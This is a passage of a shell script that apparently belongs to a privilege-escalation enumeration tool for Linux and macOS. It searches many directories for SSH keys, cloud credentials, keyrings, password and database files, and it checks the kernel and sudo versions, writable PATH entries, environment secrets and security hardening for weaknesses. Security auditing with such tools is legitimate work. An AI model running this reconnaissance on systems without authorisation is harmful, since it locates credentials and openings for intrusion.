  FIND_DIR_MNT=`eval_bckgrd "find /mnt -type d $FIND_MYSQL_RELEVANT_NAMES -o $FIND_CHROME_RELEVANT_NAMES -o $FIND_FIREFOX_RELEVANT_NAMES -o $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_FILEZILLA_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_VNC_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`

  #MacOS Directories
  FIND_DIR_PRIVATE=`eval_bckgrd "find /private -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_APPLICATIONS=`eval_bckgrd "find /Applications -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`

  # All
  FIND_HOME=`eval_bckgrd "find $HOMESEARCH $FIND_AUTOLOGIN_RELEVANT_NAMES -o $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_PGP_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_PASSWORD_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_ETC=`eval_bckgrd "find /etc/ $FIND_AUTOLOGIN_RELEVANT_NAMES -o $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_KNOCK_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_VAR=`eval_bckgrd "find /var/ $FIND_AUTOLOGIN_RELEVANT_NAMES -o $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_TMP=`eval_bckgrd "find /tmp/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_OPT=`eval_bckgrd "find /opt/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_USR=`eval_bckgrd "find /usr/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES  2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_MNT=`eval_bckgrd "find /mnt/ $FIND_AUTOLOGIN_RELEVANT_NAMES -o $FIND_KNOCK_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -o $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_PGP_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_PASSWORD_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_LIB=`eval_bckgrd "find /lib/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_RUN=`eval_bckgrd "find /run/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_SYSTEMD=`eval_bckgrd "find /systemd/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_SYSTEM=`eval_bckgrd "find /system/ $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_SYS=`eval_bckgrd "find /sys/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_SNAP=`eval_bckgrd "find /snap/ $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`

  #MacOS
  FIND_PRIVATE=`eval_bckgrd "find /private/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_PGP_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_SYSTEMD_RELEVANT_NAMES -o $FIND_TIMERS_RELEVANT_NAMES -o $FIND_SOCKETS_RELEVANT_NAMES -O $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_APPLICATIONS=`eval_bckgrd "find /Applications/ $FIND_DOCKER_RELEVANT_NAMES -o $FIND_VIM_RELEVANT_NAMES -o $FIND_GITLAB_RELEVANT_NAMES -o $FIND_PASSWD_SPLUNK_RELEVANT_NAMES -o $FIND_BACKUPMANAGER_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES -o $FIND_POSTGRESQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_PHP_RELEVANT_NAMES -o $FIND_WORDPRESS_RELEVANT_NAMES -o $FIND_DRUPAL_RELEVANT_NAMES -o $FIND_MOODLE_RELEVANT_NAMES -o $FIND_TOMCAT_RELEVANT_NAMES -o $FIND_MONGO_RELEVANT_NAMES -o $FIND_SUPERVISORD_RELEVANT_NAMES -o $FIND_CESI_RELEVANT_NAMES -o $FIND_RSYNCD_RELEVANT_NAMES -o $FIND_HOSTAPAD_RELEVANT_NAMES -o $FIND_ANACONDA_KS_RELEVANT_NAMES -o $FIND_OVPN_RELEVANT_NAMES -o $FIND_SSH_RELEVANT_NAMES -o $FIND_CLOUD_KEYS_RELEVANT_NAMES -o $FIND_KIBANA_RELEVANT_NAMES -o $FIND_ELASTICSEARCH_RELEVANT_NAMES -o $FIND_REDIS_RELEVANT_NAMES -o $FIND_MOSQUITTO_RELEVANT_NAMES -o $FIND_DB_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_ERLANG_RELEVANT_NAMES -o $FIND_GVM_RELEVANT_NAMES -o $FIND_IPSEC_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  wait # Always wait at the end
  CONT_THREADS=0 #Reset the threads counter

  ##### POST SERACH VARIABLES #####
  backup_folders=`echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS" | tr ' ' '\n' | grep -v "/lib" | grep -E "backup$|backups$"`
  backup_folders_row="`echo $backup_folders | tr '\n' ' '`"
  printf $Y"DONE\n"$NC
  echo ""
fi


if [ "`echo $CHECKS | grep SysI`" ]; then
  ###########################################
  #-------------) System Info (-------------#
  ###########################################
  printf $B"════════════════════════════════════╣ "$GREEN"System Information"$B" ╠════════════════════════════════════\n"$NC

  #-- SY) OS
  printf $Y"[+] "$GREEN"Operative system\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits\n"$NC
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel7,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelB,${C}[1;31m&${C}[0m,"
  lsb_release -a 2>/dev/null
  echo ""

  #-- SY) Sudo 
  printf $Y"[+] "$GREEN"Sudo version\n"$NC
  if [ "`command -v sudo 2>/dev/null`" ]; then
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version\n"$NC
    sudo -V 2>/dev/null | grep "Sudo ver" | sed -${E} "s,$sudovB,${C}[1;31m&${C}[0m,"
  else echo_not_found "sudo"
  fi
  echo ""

  #--SY) USBCreator
  printf $Y"[+] "$GREEN"USBCreator\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation\n"$NC
  if busctl list 2>/dev/null | grep -q com.ubuntu.USBCreator; then
    pc_version=$(dpkg -l 2>/dev/null | grep policykit-desktop-privileges | grep -oP "[0-9][0-9a-zA-Z\.]+")
    if [ -z "$pc_version" ]; then
        pc_version=$(apt-cache policy policykit-desktop-privileges 2>/dev/null | grep -oP "\*\*\*.*" | cut -d" " -f2)
    fi
    if [ -n "$pc_version" ]; then
        pc_length=${#pc_version}
        pc_major=$(echo "$pc_version" | cut -d. -f1)
        pc_minor=$(echo "$pc_version" | cut -d. -f2)
        if [ $pc_length -eq 4 -a $pc_major -eq 0 -a $pc_minor  -lt 21 ]; then
            echo "Vulnerable!!" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
        fi
    fi
  fi
  echo ""

  #-- SY) PATH
  printf $Y"[+] "$GREEN"PATH\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses\n"$NC
  echo $OLDPATH 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\.,${C}[1;31;103m&${C}[0m,g"
  echo "New path exported: $PATH" 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\. ,${C}[1;31;103m&${C}[0m,g" 
  echo ""

  #-- SY) Date
  printf $Y"[+] "$GREEN"Date\n"$NC
  date 2>/dev/null || echo_not_found "date"
  echo ""

  #-- SY) System stats
  printf $Y"[+] "$GREEN"System stats\n"$NC
  (df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
  free 2>/dev/null || echo_not_found "free"
  echo ""
  
  #-- SY) CPU info
  printf $Y"[+] "$GREEN"CPU info\n"$NC
  lscpu 2>/dev/null || echo_not_found "lscpu"
  echo ""

  #-- SY) Environment vars 
  printf $Y"[+] "$GREEN"Environment\n"$NC
  printf $B"[i] "$Y"Any private information inside environment variables?\n"$NC
  (env || set) 2>/dev/null | grep -v "RELEVANT*\|FIND*\|^VERSION=\|dbuslistG\|mygroups\|ldsoconfdG\|pwd_inside_history\|kernelDCW_Ubuntu_Precise\|kernelDCW_Ubuntu_Trusty\|kernelDCW_Ubuntu_Xenial\|kernelDCW_Rhel\|^sudovB=\|^rootcommon=\|^mounted=\|^mountG=\|^notmounted=\|^mountpermsB=\|^mountpermsG=\|^kernelB=\|^C=\|^RED=\|^GREEN=\|^Y=\|^B=\|^NC=\|TIMEOUT=\|groupsB=\|groupsVB=\|knw_grps=\|sidG\|sidB=\|sidVB=\|sudoB=\|sudoG=\|sudoVB=\|sudocapsB=\|timersG=\|capsB=\|\notExtensions=\|Wfolders=\|writeB=\|writeVB=\|_usrs=\|compiler=\|PWD=\|LS_COLORS=\|pathshG=\|notBackup=\|processesDump\|processesB\|commonrootdirs" | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[aA][pP][iI][kK][eE][yY]|[aA][pP][iI][_][kK][eE][yY],${C}[1;31m&${C}[0m,g" || echo_not_found "env || set"
  echo ""

  #-- SY) Dmesg
  printf $Y"[+] "$GREEN"Searching Signature verification failed in dmseg\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed\n"$NC
  (dmesg 2>/dev/null | grep "signature") || echo_not_found
  echo ""

  #-- SY) AppArmor
  printf $Y"[+] "$GREEN"AppArmor enabled? .............. "$NC
  if [ `command -v aa-status 2>/dev/null` ]; then
    aa-status 2>&1 | sed "s,disabled,${C}[1;31m&${C}[0m,"
  elif [ `command -v apparmor_status 2>/dev/null` ]; then
    apparmor_status 2>&1 | sed "s,disabled,${C}[1;31m&${C}[0m,"
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo_not_found "AppArmor"
  fi

  #-- SY) grsecurity
  printf $Y"[+] "$GREEN"grsecurity present? ............ "$NC
  ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo_not_found "grsecurity")

  #-- SY) PaX
  printf $Y"[+] "$GREEN"PaX bins present? .............. "$NC
  (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo_not_found "PaX")

  #-- SY) Execshield
  printf $Y"[+] "$GREEN"Execshield enabled? ............ "$NC
  (grep "exec-shield" /etc/sysctl.conf 2>/dev/null || echo_not_found "Execshield") | sed "s,=0,${C}[1;31m&${C}[0m,"

  #-- SY) SElinux
  printf $Y"[+] "$GREEN"SELinux enabled? ............... "$NC
  (sestatus 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${C}[1;31m&${C}[0m,"

  #-- SY) ASLR
  printf $Y"[+] "$GREEN"Is ASLR enabled? ............... "$NC
  ASLR=`cat /proc/sys/kernel/randomize_va_space 2>/dev/null`
  if [ -z "$ASLR" ]; then 
    echo_not_found "/proc/sys/kernel/randomize_va_space"; 
  else
    if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
    echo ""
  fi

  #-- SY) Printer
  printf $Y"[+] "$GREEN"Printer? ....................... "$NC
  lpstat -a 2>/dev/null || echo_not_found "lpstat"
  
   #-- SY) Running in a virtual environment
  printf $Y"[+] "$GREEN"Is this a virtual machine? ..... "$NC
  hypervisorflag=`cat /proc/cpuinfo 2>/dev/null | grep flags | grep hypervisor`
  if [ `command -v systemd-detect-virt 2>/dev/null` ]; then
    detectedvirt=`systemd-detect-virt`
    if [ "$hypervisorflag" ]; then printf $RED"Yes ("$detectedvirt")"$NC; else printf $GREEN"No"$NC; fi
  else
    if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
  fi
  echo ""

  #-- SY) Container
  printf $Y"[+] "$GREEN"Is this a container? ........... "$NC
  dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -maxdepth 3 -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
  lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
  if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,";
  elif [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,";
  else echo_no
  fi

  #-- SY) Containers Running
  printf $Y"[+] "$GREEN"Any running containers? ........ "$NC
  # Get counts of running containers for each platform
  dockercontainers=`docker ps --format "{{.Names}}" 2>/dev/null | wc -l`
  lxccontainers=`lxc list -c n --format csv 2>/dev/null | wc -l`
